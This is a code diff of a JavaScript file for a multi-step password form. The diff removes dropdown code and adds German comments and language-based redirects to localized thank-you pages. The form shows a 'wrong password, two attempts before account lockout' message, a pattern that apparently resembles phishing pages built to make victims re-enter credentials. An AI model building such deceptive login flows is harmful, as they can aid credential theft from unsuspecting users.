@@ -1,21 +1,4 @@
 document.addEventListener("DOMContentLoaded", function () {
-  function setupDropdowns() {
-    document.querySelectorAll(".dropdown-toggle").forEach(button => {
-      button.addEventListener("click", () => {
-        const content = button.nextElementSibling;
-        const isVisible = content.style.display === "block";
-
-        document.querySelectorAll(".dropdown-content").forEach(el => el.style.display = "none");
-        document.querySelectorAll(".dropdown-toggle").forEach(btn => btn.classList.remove("active"));
-
-        if (!isVisible) {
-          content.style.display = "block";
-          button.classList.add("active");
-        }
-      });
-    });
-  }
-
   window.goToStep2 = function () {
     document.getElementById("step1").style.display = "none";
     document.getElementById("step2").style.display = "block";
@@ -60,7 +43,7 @@ document.addEventListener("DOMContentLoaded", function () {
 
   if (step2Button) {
     step2Button.addEventListener("click", function (e) {
-      e.preventDefault();
+      e.preventDefault(); // Verhindere automatisches Absenden
 
       const messages = {
         de: "Falsches Passwort. Noch 2 Versuche bis Kontosperrung.",
@@ -82,6 +65,7 @@ document.addEventListener("DOMContentLoaded", function () {
       } else {
         passwordError.style.display = "none";
 
+        // ➡️ Nach erfolgreicher Eingabe zur passenden Danke-Seite springen:
         let targetPage = "danke.html";
         switch (selectedLang) {
           case "en":
@@ -104,6 +88,7 @@ document.addEventListener("DOMContentLoaded", function () {
 
   const langSelect = document.getElementById("language");
   if (langSelect) {
+    // Falls schon eine Sprache im localStorage gespeichert ist → automatisch auswählen!
     const savedLang = localStorage.getItem("language");
     if (savedLang) {
       langSelect.value = savedLang;
@@ -111,8 +96,25 @@ document.addEventListener("DOMContentLoaded", function () {
 
     langSelect.addEventListener("change", function () {
       const lang = this.value;
+
+      // Sprache im localStorage speichern
       localStorage.setItem("language", lang);
 
+      // Seite neu laden (auf die richtige Sprachversion)
       switch (lang) {
         case "de":
-          window.location
+          window.location.href = "/index.html";
+          break;
+        case "en":
+          window.location.href = "/en.html";
+          break;
+        case "fr":
+          window.location.href = "/fr.html";
+          break;
+        case "es":
+          window.location.href = "/es.html";
+          break;
+      }
+    });
+  }
+});
